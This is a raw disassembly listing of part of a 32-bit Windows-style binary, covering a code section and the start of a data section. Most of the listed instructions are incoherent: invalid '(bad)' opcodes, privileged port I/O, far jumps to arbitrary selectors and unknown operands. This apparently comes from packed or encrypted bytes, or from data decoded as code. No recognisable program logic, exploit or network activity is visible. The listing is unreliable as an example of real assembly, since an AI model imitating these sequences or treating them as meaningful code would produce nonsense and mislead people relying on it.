  41c723:	xchg   BYTE PTR ds:0xb5fed9d0,bl
  41c729:	dec    esi
  41c72a:	lahf   
  41c72b:	ins    BYTE PTR es:[edi],dx
  41c72c:	std    
  41c72d:	mov    bl,0x8c
  41c72f:	out    0x82,eax
  41c731:	ficomp DWORD PTR [ebp+eiz*4+0xf]
  41c735:	mov    DWORD PTR [edx+0x13],ebx
  41c738:	loopne 0x41c7b5
  41c73a:	mov    esp,edi
  41c73c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c73d:	jmp    0xfcb37421
  41c742:	scas   eax,DWORD PTR es:[edi]
  41c743:	(bad)  
  41c744:	call   0x6cd28e74
  41c749:	xchg   esp,eax
  41c74a:	jno    0x41c6eb
  41c74c:	jne    0x41c75b
  41c74e:	in     eax,dx
  41c74f:	retf   0x88f9
  41c752:	in     al,dx
  41c753:	mov    bl,0x97
  41c755:	or     edx,DWORD PTR [edx]
  41c757:	mov    WORD PTR [ebp-0x7d],cs
  41c75a:	xchg   BYTE PTR [ebx-0x59],bl
  41c75d:	push   cs
  41c75e:	call   FWORD PTR [esi+0x20]
  41c761:	lahf   
  41c762:	dec    esi
  41c763:	adc    eax,0x71b7f0a5
  41c768:	je     0x41c75d
  41c76a:	mov    eax,ds:0xdf9cc538
  41c76f:	dec    ecx
  41c770:	ins    DWORD PTR es:[edi],dx
  41c771:	in     eax,dx
  41c772:	ror    DWORD PTR [eax-0x50],1
  41c775:	jo     0x41c7b7
  41c777:	ja     0x41c7c2
  41c779:	jmp    0x41c755
  41c77b:	jge    0x41c7d1
  41c77d:	jb     0x41c7d0
  41c77f:	push   cs
  41c780:	std    
  41c781:	push   edi
  41c782:	or     ebp,DWORD PTR [ebx-0xbbaa576]
  41c788:	rol    bh,cl
  41c78a:	mov    dl,0xbd
  41c78c:	jb     0x41c7b7
  41c78e:	and    cl,BYTE PTR [ebx]
  41c790:	popa   
  41c791:	adc    BYTE PTR [edi],ch
  41c793:	jnp    0x41c724
  41c795:	pop    ds
  41c796:	jecxz  0x41c782
  41c798:	mov    dl,0xf3
  41c79a:	ret    0xb3f8
  41c79d:	inc    ebp
  41c79e:	in     al,0x15
  41c7a0:	sub    bl,BYTE PTR [esp+edi*4+0x3e090ea]
  41c7a7:	or     dh,BYTE PTR [esi]
  41c7a9:	les    edx,FWORD PTR [esi+0x15c4fdad]
  41c7af:	mov    dl,0x5a
  41c7b1:	or     esi,DWORD PTR [ebx-0x5b0667f7]
  41c7b7:	xchg   DWORD PTR [edx+0x43],esi
  41c7ba:	xchg   BYTE PTR [eax-0x71],bh
  41c7bd:	jmp    0x41c802
  41c7bf:	shl    BYTE PTR [eax-0x5f575050],cl
  41c7c5:	cmp    eax,0x1e4a08df
  41c7ca:	jp     0x41c7d9
  41c7cc:	fcomp  st(0)
  41c7ce:	(bad)  
  41c7cf:	imul   edi,DWORD PTR [ebx+edx*8-0x80],0x1aca6cc0
  41c7d7:	jge    0x41c805
  41c7d9:	mov    fs,WORD PTR ds:0x6bf21000
  41c7df:	js     0x41c83c
  41c7e1:	fidivr WORD PTR [ebx-0xc2f2520]
  41c7e7:	or     al,0x53
  41c7e9:	loop   0x41c773
  41c7eb:	imul   ebx,DWORD PTR [ebx+0x5354e03a],0xdf04d81
  41c7f5:	xchg   edx,eax
  41c7f6:	jmp    0x41c7cf
  41c7f8:	and    ecx,DWORD PTR [esi+0x70]
  41c7fb:	ja     0x41c7b0
  41c7fd:	jbe    0x41c876
  41c7ff:	or     eax,0x84425815
  41c804:	ss pop ss
  41c806:	ret    0xa9d5
  41c809:	dec    ecx
  41c80a:	sbb    DWORD PTR [edi-0x6d],ebx
  41c80d:	repnz jmp 0x6e88:0x5dbced0c
  41c815:	xchg   edx,eax
  41c816:	sbb    DWORD PTR [esi-0x1d5147e4],0x4b
  41c81d:	outs   dx,DWORD PTR ds:[esi]
  41c81e:	js     0x41c7c2
  41c820:	pop    esi
  41c821:	mov    al,0x2b
  41c823:	and    edi,DWORD PTR [ebp-0xd]
  41c826:	xor    al,0xf4
  41c828:	pop    ss
  41c829:	pop    edi
  41c82a:	mov    esp,0x2d43fa44
  41c82f:	rol    DWORD PTR [ebx+0x5],1
  41c832:	test   eax,0x2007e05d
  41c837:	imul   esi,DWORD PTR [edi+0x7833301e],0xf188708a
  41c841:	mov    dh,0x3c
  41c843:	inc    ebp
  41c844:	(bad)  
  41c846:	inc    eax
  41c847:	pop    ebx
  41c848:	shr    DWORD PTR [ecx-0x25],cl
  41c84b:	sub    BYTE PTR [esi],al
  41c84d:	inc    ebx
  41c84e:	add    al,0x83
  41c850:	mov    ah,0x86
  41c852:	add    DWORD PTR [edx*4+0x3986176e],esi
  41c859:	dec    ebx
  41c85a:	hlt    
  41c85b:	mov    DWORD PTR fs:[ecx-0x77],ebx
  41c85f:	test   DWORD PTR [edi+0x2b],ebx
  41c862:	lahf   
  41c863:	mov    dh,0xb6
  41c865:	jo     0x41c86f
  41c867:	lahf   
  41c868:	mov    DWORD PTR [eax],ebx
  41c86a:	iret   
  41c86b:	jmp    0x7d00:0xdc063af
  41c872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c873:	jns    0x41c857
  41c875:	sub    bl,ch
  41c877:	daa    
  41c878:	sbb    al,cl
  41c87a:	repnz cmp eax,0xf5af8456
  41c880:	xchg   ebp,eax
  41c881:	jns    0x41c8ab
  41c883:	push   eax
  41c884:	add    esp,DWORD PTR [ecx]
  41c886:	(bad)  
  41c887:	xor    ecx,DWORD PTR [ebx]
  41c889:	sub    ah,ah
  41c88b:	jge    0x41c819
  41c88d:	mov    ch,0x7
  41c88f:	xor    eax,0x1738a8c0
  41c894:	mov    dh,0x98
  41c896:	les    edx,FWORD PTR [eax-0x1f]
  41c899:	scas   al,BYTE PTR es:[edi]
  41c89a:	cs add eax,0x7a89bcb4
  41c8a0:	and    eax,0x2bf56465
  41c8a5:	aam    0x3b
  41c8a7:	popa   
  41c8a8:	pop    ss
  41c8a9:	es ss fwait
  41c8ac:	into   
  41c8ad:	pop    edi
  41c8ae:	cmp    BYTE PTR [edx],dl
  41c8b0:	mov    ds:0xcfdb4b91,eax
  41c8b5:	dec    edx
  41c8b6:	fistp  QWORD PTR [esp+ebp*2]
  41c8b9:	push   ecx
  41c8ba:	je     0x41c8a4
  41c8bc:	clc    
  41c8bd:	jmp    0xc970:0xecc7eb6d
  41c8c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8c5:	dec    esi
  41c8c6:	push   cs
  41c8c7:	clc    
  41c8c8:	sbb    edi,DWORD PTR [edi+ebx*4+0x5a]
  41c8cc:	stos   BYTE PTR es:[edi],al
  41c8cd:	daa    
  41c8ce:	les    edx,FWORD PTR [eax]
  41c8d0:	iret   
  41c8d1:	cmp    cl,0x6d
  41c8d4:	pop    eax
  41c8d5:	std    
  41c8d6:	xchg   DWORD PTR [edx+eiz*2],ebp
  41c8d9:	push   ecx
  41c8da:	ror    BYTE PTR [esi+0x73cf64a],cl
  41c8e0:	push   ebp
  41c8e1:	data16 int 0x17
  41c8e4:	js     0x41c8e9
  41c8e6:	arpl   bp,di
  41c8e8:	test   al,0xca
  41c8ea:	dec    ebp
  41c8eb:	shl    DWORD PTR [esi+0x3434a08],cl
  41c8f1:	sbb    al,0x1a
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	cmp    eax,DWORD PTR [esi-0x8e77a1a]
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c8ec
  41c91c:	adc    DWORD PTR [ebp-0x2cbaf044],0xd741c924
  41c926:	adc    DWORD PTR [ebp+ebx*4-0x4f],0xffffffeb
  41c92b:	std    
  41c92c:	pop    ss
  41c92d:	pop    esi
  41c92e:	(bad)  [ebx]
  41c930:	daa    
  41c931:	fcom   DWORD PTR [ecx-0x21]
  41c934:	sti    
  41c935:	or     ebx,DWORD PTR [edi+0x79ff532d]
  41c93b:	adc    al,0x96
  41c93d:	idiv   BYTE PTR [eax+0x6b7e5cdc]
  41c943:	ficomp WORD PTR [ebp+0x2fcf1582]
  41c949:	dec    ecx
  41c94a:	fmul   st,st(3)
  41c94c:	clc    
  41c94d:	jbe    0x41c974
  41c94f:	int3   
  41c950:	retf   0x89a6
  41c953:	sub    bl,ch
  41c955:	jmp    0xc167:0xe4e88199
  41c95c:	scas   al,BYTE PTR es:[edi]
  41c95d:	pusha  
  41c95e:	or     eax,0x2d7b95cf
  41c963:	dec    DWORD PTR [esp+ecx*4-0x4f642e5b]
  41c96a:	hlt    
  41c96b:	xchg   edi,eax
  41c96c:	push   ebx
  41c96d:	fsubr  st,st(7)
  41c96f:	pop    ss
  41c970:	test   al,0x9c
  41c972:	sub    DWORD PTR [ebx-0x12777156],edi
  41c978:	xchg   ecx,eax
  41c979:	mov    dh,BYTE PTR [ebp+0x7fb3b070]
  41c97f:	in     al,0xe9
  41c981:	pop    eax
  41c982:	mov    eax,0xbddd2d70
  41c987:	push   ss
  41c988:	addr16 xor esp,esp
  41c98b:	xor    eax,0x178077b2
  41c990:	xchg   esp,eax
  41c991:	lods   al,BYTE PTR ds:[esi]
  41c992:	pop    ecx
  41c993:	push   ds
  41c994:	test   edi,0x6061ccf7
  41c99a:	mov    al,ds:0x8d0305c5
  41c99f:	fadd   st(5),st
  41c9a1:	push   ds
  41c9a2:	xor    al,0x30
  41c9a4:	sub    BYTE PTR [edx-0x2ab5f056],dh
  41c9aa:	push   ebx
  41c9ab:	jnp    0x41ca12
  41c9ad:	call   0xaf0:0x30890e7c
  41c9b4:	cmp    eax,0xbead9f1c
  41c9b9:	fmul   QWORD PTR [eax-0x7fc4a6af]
  41c9bf:	xchg   ebx,eax
  41c9c0:	cld    
  41c9c1:	mov    dl,0x1
  41c9c3:	sub    bl,BYTE PTR [edx]
  41c9c5:	add    DWORD PTR [edi-0x32],esi
  41c9c8:	enter  0x4243,0xd7
  41c9cc:	sub    dl,dl
  41c9ce:	cmp    al,0xf6
  41c9d0:	jle    0x41c987
  41c9d2:	jecxz  0x41c9e8
  41c9d4:	sti    
  41c9d5:	fsub   DWORD PTR [edi-0x31d3b004]
  41c9db:	scas   eax,DWORD PTR es:[edi]
  41c9dc:	and    BYTE PTR [eax+ebx*8],0xad
  41c9e0:	mov    ?,WORD PTR [edi]
  41c9e2:	ja     0x41c993
  41c9e4:	dec    eax
  41c9e5:	test   bl,bl
  41c9e7:	retf   
  41c9e8:	adc    al,0xbf
  41c9ea:	dec    ebp
  41c9eb:	std    
  41c9ec:	cwde   
  41c9ed:	cs cld 
  41c9ef:	xor    al,0xda
  41c9f1:	std    
  41c9f2:	clc    
  41c9f3:	mov    eax,ds:0x6dea6063
  41c9f8:	int    0x62
  41c9fa:	xchg   ecx,eax
  41c9fb:	fidivr DWORD PTR [esi+esi*4-0x74]
  41c9ff:	pop    ds
  41ca00:	pop    esp
  41ca01:	test   BYTE PTR [edx+eiz*1],0x41
  41ca05:	imul   ebx
  41ca07:	adc    eax,0x1be3f0f6
  41ca0c:	pop    es
  41ca0d:	or     bh,bl
  41ca0f:	pop    ss
  41ca10:	and    eax,DWORD PTR [ecx]
  41ca12:	rcl    BYTE PTR [edx-0xa2f99ac],1
  41ca18:	or     ah,bl
  41ca1a:	cmp    eax,0xe3adc6b7
  41ca1f:	xchg   edx,eax
  41ca20:	sbb    ch,BYTE PTR [eax-0x52]
  41ca23:	xor    BYTE PTR [ebp-0x75],ah
  41ca26:	cwde   
  41ca27:	jecxz  0x41ca40
  41ca29:	cs clc 
  41ca2b:	xchg   esi,esp
  41ca2d:	sub    al,0x90
  41ca2f:	jb     0x41ca19
  41ca31:	push   edx
  41ca32:	inc    ecx
  41ca33:	js     0x41ca63
  41ca35:	call   0x3f167cec
  41ca3a:	(bad)  
  41ca3b:	repz push esp
  41ca3d:	sbb    al,0x62
  41ca3f:	les    edx,FWORD PTR [edx-0x19]
  41ca42:	sbb    dh,BYTE PTR [ecx-0x21]
  41ca45:	jp     0x41ca0c
  41ca47:	jbe    0x41ca22
  41ca49:	mov    eax,ds:0x837666ee
  41ca4e:	mov    BYTE PTR ds:0x68d2955f,dh
  41ca54:	pop    esp
  41ca55:	out    dx,al
  41ca56:	mov    ebx,0x733c2165
  41ca5b:	call   0x1794058b
  41ca60:	retf   0x3d9
  41ca63:	leave  
  41ca64:	sbb    BYTE PTR [edx-0x5d],dl
  41ca67:	sub    edi,DWORD PTR [edi+0x3fad02e9]
  41ca6d:	push   cs
  41ca6e:	jmp    0x41ca42
  41ca70:	adc    al,0xa8
  41ca72:	sar    BYTE PTR [edx+0x4f607c8f],cl
  41ca78:	and    DWORD PTR ds:0xf5d3f11e,ecx
  41ca7e:	sub    al,0x68
  41ca80:	add    dl,BYTE PTR [eax+0x7beef803]
  41ca86:	and    esi,DWORD PTR [ecx+0x6e]
  41ca89:	xchg   esp,eax
  41ca8a:	nop
  41ca8b:	sub    al,BYTE PTR [edx]
  41ca8d:	in     eax,dx
  41ca8e:	(bad)  
  41ca8f:	in     eax,0x93
  41ca91:	jnp    0x41ca2a
  41ca93:	inc    edx
  41ca94:	cmp    bh,BYTE PTR [esi]
  41ca96:	push   edi
  41ca97:	jo     0x41caeb
  41ca99:	inc    esi
  41ca9a:	inc    esp
  41ca9b:	int3   
  41ca9c:	adc    bl,ch
  41ca9e:	lock xchg ebx,eax
  41caa0:	imul   edx,ebx,0x92f31731
  41caa6:	int    0x36
  41caa8:	mov    eax,0xda1f69b5
  41caad:	mov    ds:0xde4f2077,eax
  41cab2:	frstor [ebp-0x744e7a68]
  41cab8:	enter  0x63af,0xfa
  41cabc:	out    dx,eax
  41cabd:	push   ebx
  41cabe:	add    edx,DWORD PTR [edx-0x1e]
  41cac1:	ret    
  41cac2:	fisttp DWORD PTR [esi]
  41cac4:	inc    ecx
  41cac5:	cmp    DWORD PTR cs:[esi-0x5a30c5a1],ecx
  41cacc:	js     0x41ca8f
  41cace:	fs popa 
  41cad0:	or     eax,0xf95eec1c
  41cad5:	add    ecx,DWORD PTR [esi+0x23be4034]
  41cadb:	outs   dx,BYTE PTR ds:[esi]
  41cadc:	pop    ds
  41cadd:	ret    
  41cade:	mov    eax,ds:0x3e955d54
  41cae3:	xchg   edi,eax
  41cae4:	and    dh,al
  41cae6:	retf   
  41cae7:	xchg   BYTE PTR [ecx+0x5cb355],cl
  41caed:	push   edx
  41caee:	cs pushf 
  41caf0:	rcl    eax,cl
  41caf2:	xchg   ebx,eax
  41caf3:	stos   DWORD PTR es:[edi],eax
  41caf4:	ds scas al,BYTE PTR es:[edi]
  41caf6:	xor    DWORD PTR [esi+esi*2+0x5a],ebp
  41cafa:	adc    ebp,DWORD PTR [esi+0x31de4b0f]
  41cb00:	and    BYTE PTR [edi],dh
  41cb02:	test   al,0x30
  41cb04:	xchg   ebp,eax
  41cb05:	sbb    BYTE PTR fs:[edi-0x25],ah
  41cb09:	and    BYTE PTR [edx-0x74],ah
  41cb0c:	ret    
  41cb0d:	cmp    BYTE PTR [esi],0xbe
  41cb10:	and    eax,DWORD PTR [esi]
  41cb12:	and    DWORD PTR [edx+ebx*1],esi
  41cb15:	push   esi
  41cb16:	call   0x28f91421
  41cb1b:	fst    QWORD PTR [ebx-0x2e78aff2]
  41cb21:	imul   BYTE PTR [ecx-0x7b7d7d25]
  41cb27:	js     0x41cb45
  41cb29:	mov    DWORD PTR [eax],eax
  41cb2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb2c:	xchg   edx,eax
  41cb2d:	nop
  41cb2e:	aas    
  41cb2f:	add    ecx,edi
  41cb31:	add    eax,DWORD PTR [ecx+0x230e95e]
  41cb37:	add    BYTE PTR [eax],al
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x386e6037
  41cb47:	rcr    BYTE PTR [edx],cl
  41cb49:	xor    ch,dh
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cadd
  41cb52:	and    bl,al
  41cb54:	shl    DWORD PTR [ecx-0x32],cl
  41cb57:	sub    al,0x71
  41cb59:	rol    DWORD PTR [edx+esi*1+0x7b],1
  41cb5d:	add    eax,0xe4b51acd
  41cb62:	ins    DWORD PTR es:[edi],dx
  41cb63:	sub    BYTE PTR [ebx+0x11],0xfe
  41cb67:	loopne 0x41cb3e
  41cb69:	push   ebx
  41cb6a:	dec    esp
  41cb6b:	iret   
  41cb6c:	in     al,dx
  41cb6d:	sbb    eax,0xa64463bf
  41cb72:	cmp    bh,BYTE PTR [ebp+0x2f]
  41cb75:	int3   
  41cb76:	ror    BYTE PTR [esp+esi*4],1
  41cb79:	dec    esi
  41cb7a:	loope  0x41cb2c
  41cb7c:	add    al,0x5f
  41cb7e:	add    eax,0x9dacdb88
  41cb83:	mov    bh,0x1d
  41cb85:	mov    ah,0xf7
  41cb87:	add    bh,0x25
  41cb8a:	mov    ?,WORD PTR [esi+0x6b]
  41cb8d:	(bad)  
  41cb8e:	push   esp
  41cb8f:	out    0xd4,eax
  41cb91:	repz push eax
  41cb93:	out    0xdf,al
  41cb95:	loop   0x41cb2e
  41cb97:	sub    ch,dh
  41cb99:	xor    ebp,DWORD PTR [ebx-0x7d]
  41cb9c:	adc    BYTE PTR [eax+0xc],0x70
  41cba0:	jne    0x41cbe9
  41cba2:	mov    ecx,0xb0edda54
  41cba7:	call   0x249bb096
  41cbac:	cmp    al,0xbe
  41cbae:	arpl   WORD PTR [ebx+esi*1+0x61],ax
  41cbb2:	gs cmp BYTE PTR cs:[ebx],ch
  41cbb6:	lds    ebx,FWORD PTR [esi+0x1f]
  41cbb9:	mov    ch,bh
  41cbbb:	test   eax,0x80fdfce3
  41cbc0:	stos   BYTE PTR es:[edi],al
  41cbc1:	xchg   ecx,ebp
  41cbc3:	je     0x41cbd0
  41cbc5:	adc    ch,dl
  41cbc7:	shr    BYTE PTR [eax+0x3b],1
  41cbca:	bound  edx,QWORD PTR [eax]
  41cbcc:	inc    eax
  41cbcd:	dec    edx
  41cbce:	push   ss
  41cbcf:	push   0x4abd958d
  41cbd4:	inc    ebp
  41cbd5:	and    cl,BYTE PTR [eax+0x7153ecb1]
  41cbdb:	out    dx,al
  41cbdc:	or     esp,0xffffffa8
  41cbdf:	jecxz  0x41cbdd
  41cbe1:	retf   0x1ab8
  41cbe4:	fcmove st,st(5)
  41cbe6:	cld    
  41cbe7:	mov    edi,0xce3e3cba
  41cbec:	lsl    ebp,WORD PTR [ebp+0x5b4f86f6]
  41cbf3:	dec    ecx
  41cbf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbf5:	pushf  
  41cbf6:	add    dl,BYTE PTR [ecx]
  41cbf8:	adc    eax,0xfd96be00
  41cbfd:	leave  
  41cbfe:	pop    es
  41cbff:	sub    ch,dl
  41cc01:	pop    edx
  41cc02:	xchg   edx,eax
  41cc03:	mov    ds,WORD PTR [eax-0x6fbef2a3]
  41cc09:	(bad)  
  41cc0a:	cwde   
  41cc0b:	data16 sahf 
  41cc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc0e:	sbb    al,0xa1
  41cc10:	push   edx
  41cc11:	pop    ss
  41cc12:	cmp    edi,DWORD PTR [eax]
  41cc14:	cmp    BYTE PTR [esi],0xec
  41cc17:	mov    ds,WORD PTR [eax-0xa]
  41cc1a:	mov    bl,0x12
  41cc1c:	ret    
  41cc1d:	sub    al,0xe3
  41cc1f:	pushf  
  41cc20:	xchg   esp,eax
  41cc21:	in     al,0xda
  41cc23:	and    al,0xfe
  41cc25:	push   cs
  41cc26:	dec    ebp
  41cc27:	mov    bh,0x5a
  41cc29:	add    BYTE PTR [edi-0x2cf0a205],0xfd
  41cc30:	jbe    0x41cbc4
  41cc32:	or     BYTE PTR [esi-0x41],cl
  41cc35:	fcom   QWORD PTR [ebx-0x3d]
  41cc38:	push   edi
  41cc39:	push   ecx
  41cc3a:	add    esp,DWORD PTR [edi]
  41cc3c:	hlt    
  41cc3d:	out    0x9a,eax
  41cc3f:	sbb    edi,ebp
  41cc41:	mov    esi,0xea3a4bfb
  41cc46:	jnp    0x41cc08
  41cc48:	add    BYTE PTR [edx+0x14f65294],0xac
  41cc4f:	cdq    
  41cc50:	(bad)  
  41cc51:	clc    
  41cc52:	jae    0x41cc63
  41cc54:	add    BYTE PTR [edi+0x6c],bh
  41cc57:	(bad)
  41cc5b:	push   0x5451a7ef
  41cc60:	cmp    DWORD PTR [ebx-0x59],ebp
  41cc63:	(bad)  
  41cc64:	fnstenv [ebx-0x78533d61]
  41cc6a:	inc    edx
  41cc6b:	inc    edx
  41cc6c:	loop   0x41ccb1
  41cc6e:	sahf   
  41cc6f:	pushf  
  41cc70:	sahf   
  41cc71:	repnz mov bl,0x34
  41cc74:	fwait
  41cc75:	rcl    DWORD PTR cs:[ebp-0x26e56977],cl
  41cc7c:	or     al,0x3
  41cc7e:	je     0x41cc6d
  41cc80:	lock sub DWORD PTR [ebx+0x39f818ef],ebx
  41cc87:	cwde   
  41cc88:	fidiv  WORD PTR [ebp-0x537112db]
  41cc8e:	stc    
  41cc8f:	sub    BYTE PTR [ecx-0x67],bh
  41cc92:	aaa    
  41cc93:	and    esp,esi
  41cc95:	das    
  41cc96:	push   ebx
  41cc97:	mov    eax,0xfec2f09a
  41cc9c:	jne    0x41ccee
  41cc9e:	jae    0x41cc8f
  41cca0:	and    eax,0xf865dc74
  41cca5:	cwde   
  41cca6:	xchg   ebx,eax
  41cca7:	mov    edx,0x3fb48cf4
  41ccac:	push   ebp
  41ccad:	aam    0xca
  41ccaf:	push   ss
  41ccb0:	loope  0x41cc98
  41ccb2:	sbb    eax,0x85f400c0
  41ccb7:	or     eax,0xa055374f
  41ccbc:	xchg   ebp,eax
  41ccbd:	dec    esp
  41ccbe:	dec    dh
  41ccc0:	retf   
  41ccc1:	test   al,0xea
  41ccc3:	cwde   
  41ccc4:	add    DWORD PTR [esi+eiz*4],0x67
  41ccc8:	xchg   edi,eax
  41ccc9:	test   eax,0x6c360606
  41ccce:	das    
  41cccf:	jns    0x41cc61
  41ccd1:	cdq    
  41ccd2:	imul   esp,DWORD PTR [esi],0xffffffac
  41ccd5:	fwait
  41ccd6:	dec    ebp
  41ccd7:	shl    BYTE PTR [esp+ebx*1+0x26],cl
  41ccdb:	mov    ax,ds:0xe425a29b
  41cce1:	js     0x41cce4
  41cce3:	mov    eax,0x44ad6f8d
  41cce8:	jge    0x41cd1d
  41ccea:	pop    edi
  41cceb:	shr    DWORD PTR [ecx-0x32],1
  41ccee:	and    DWORD PTR [ebx-0x48],ecx
  41ccf1:	adc    esi,DWORD PTR [ebx-0x50]
  41ccf4:	mov    ds:0x4c492592,al
  41ccf9:	mov    ds:0xfcad4606,eax
  41ccfe:	test   edi,ebp
  41cd00:	pop    eax
  41cd01:	mov    esp,0x9944c6b
  41cd06:	mov    esp,DWORD PTR ds:0x6cb96ec5
  41cd0c:	mov    ebp,0x94a38bd8
  41cd11:	xor    ebx,DWORD PTR [esi-0x3b020fb3]
  41cd17:	jno    0x41cca7
  41cd19:	push   0xc103bb1
  41cd1e:	out    dx,eax
  41cd1f:	retf   0x25a8
  41cd22:	rcr    DWORD PTR ds:0xaee128f4,1
  41cd28:	mov    ch,0x49
  41cd2a:	add    BYTE PTR [edi],bh
  41cd2c:	lahf   
  41cd2d:	repz cmc 
  41cd2f:	pop    ebp
  41cd30:	scas   eax,DWORD PTR es:[edi]
  41cd31:	jno    0x41cd62
  41cd33:	mov    edi,0x9d90dcaf
  41cd38:	mov    eax,ds:0x889de59a
  41cd3d:	daa    
  41cd3e:	push   ecx
  41cd3f:	cli    
  41cd40:	icebp  
  41cd41:	pushf  
  41cd42:	cmp    eax,0x9454c934
  41cd47:	jnp    0x41cd4c
  41cd49:	in     eax,dx
  41cd4a:	punpckhbw mm1,QWORD PTR [ebx]
  41cd4d:	(bad)  
  41cd4e:	scas   eax,DWORD PTR es:[edi]
  41cd4f:	repz popa 
  41cd51:	lea    esp,ds:[esi]
  41cd54:	mov    esp,0xc5f94a55
  41cd59:	or     DWORD PTR [esi-0x78ade1ba],edi
  41cd5f:	push   esi
  41cd60:	jmp    DWORD PTR [ecx]
  41cd62:	push   0xffffffa1
  41cd64:	adc    dh,0x68
  41cd67:	mov    ebp,DWORD PTR [eax+0x10c2c95b]
	...

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
